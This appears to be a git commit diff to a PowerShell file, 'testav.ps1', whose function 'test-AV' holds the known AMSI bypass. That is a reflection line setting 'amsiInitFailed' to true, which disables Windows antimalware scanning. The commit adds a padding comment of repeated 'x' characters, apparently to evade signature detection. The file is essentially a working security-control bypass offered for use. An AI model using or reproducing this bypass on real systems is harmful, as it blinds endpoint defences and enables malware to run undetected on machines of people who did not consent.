0f5ee3b04ec8716c347b1a31bb48afe3cae2f5bb
Tru5tNo1 <delaurentis@live.it>
2022-12-06 12:33:09 +0100

    Update testav.ps1

--- testav.ps1
+++ testav.ps1
@@ -1,3 +1,4 @@
 function test-AV {
+<#xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx#>
 [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
 }
